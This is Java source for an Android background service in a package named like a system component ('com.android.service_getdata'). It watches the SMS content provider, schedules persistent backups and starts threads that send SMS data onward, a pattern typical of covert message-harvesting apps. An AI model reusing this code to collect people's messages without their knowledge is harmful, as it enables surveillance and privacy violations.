package com.android.service_getdata.Service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.support.v4.content.LocalBroadcastManager;
import com.android.service_getdata.Helper.AppConstant;
import com.android.service_getdata.Threads.DataSenderThread;
import com.android.service_getdata.application.ServiceApp;
import com.android.service_getdata.contentobserver.IncomingSmsHandler;
import com.android.service_getdata.contentobserver.SentSmsHandler;
import com.android.service_getdata.receivers.BackupSchedular;

public class PickDataService extends Service {

    private static final String TAG = "PickDataService";
    ContentResolver mContentResolver;
    ContentObserver mSentObserver, mIncomingSmsObserver;
    BackupSchedular mBackupSchedular;
    BroadcastReceiver mBackupReceiver;
    LocalBroadcastManager localBroadcastManager;
    DataSenderThread mDataSenderThreadSms, mDataSenderThreadCall;

    public PickDataService() {
    }

    @Override
    public void onCreate()
    {
        super.onCreate();

        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(AppConstant.BACKUP_INTENT_ACTION);

        mBackupReceiver = new BackUpReceiver();

        localBroadcastManager = LocalBroadcastManager.getInstance(ServiceApp.getAppContext());
        localBroadcastManager.registerReceiver(mBackupReceiver, intentFilter);

        mContentResolver = getContentResolver();
        //creating content observer instance
        mSentObserver = new SentSmsHandler(mSmshandler, getContentResolver());
        mIncomingSmsObserver = new IncomingSmsHandler(mSmshandler, getContentResolver());

        //registering content observer for sms
        mContentResolver.registerContentObserver(Uri.parse("content://sms"), true, mSentObserver);
        mContentResolver.registerContentObserver(Uri.parse("content://sms"), true, mIncomingSmsObserver);

        mBackupSchedular = new BackupSchedular();

        mDataSenderThreadSms = new DataSenderThread(mContentResolver,DataSenderThread.SMS_THREAD);
        mDataSenderThreadCall = new DataSenderThread(mContentResolver,DataSenderThread.CALLLOGS_THREAD);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        mBackupSchedular.SchedulebackUp(this);
        return START_STICKY;
    }

    private final Handler mSmshandler = new Handler(){
        public void handleMessage(Message msg) {
        }
    };

    @Override
    public void onDestroy() {
        getContentResolver().unregisterContentObserver(mSentObserver);
        getContentResolver().unregisterContentObserver(mIncomingSmsObserver);
        mContentResolver = null;
        mIncomingSmsObserver = null;
        localBroadcastManager.unregisterReceiver(mBackupReceiver);
        mBackupReceiver = null;
        localBroadcastManager = null;
        mBackupSchedular.unRegisterScheduledBackUp(this);
        mBackupSchedular = null;
        mDataSenderThreadSms = null;
        mDataSenderThreadCall = null;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    class BackUpReceiver extends BroadcastReceiver{

        @Override
        public void onReceive(Context context, Intent intent) {
            if (context == null || intent == null || intent.getExtras() == null)
                return;

            Bundle bundle = intent.getExtras();
            String result = bundle.getString(AppConstant.BACKUP_STATUS_RESULT);
            int result_code = bundle.getInt(AppConstant.BACKUP_STATUS_RESULT_CODE);
            BackUpStatusHandling(result_code);
        }
    }
    private void BackUpStatusHandling(int resultCode){
        switch (resultCode){
            case AppConstant.SMS_STATUS_SAVED:
                Thread threadSms = new Thread(mDataSenderThreadSms);
                threadSms.start();
                break;
            case AppConstant.CALLLOGS_STATUS_SAVED:
//                Thread threadCall = new Thread(mDataSenderThreadCall);
//                threadCall.start();
                break;
            case AppConstant.SMS_STATUS_UNSAVED:
                mBackupSchedular.unRegisterScheduledBackUp(this);
                mBackupSchedular.SchedulebackUp(this);
                break;
            case AppConstant.CALLLOGS_STATUS_UNSAVED:
                mBackupSchedular.unRegisterScheduledBackUp(this);
                mBackupSchedular.SchedulebackUp(this);
                break;
        }
    }

}
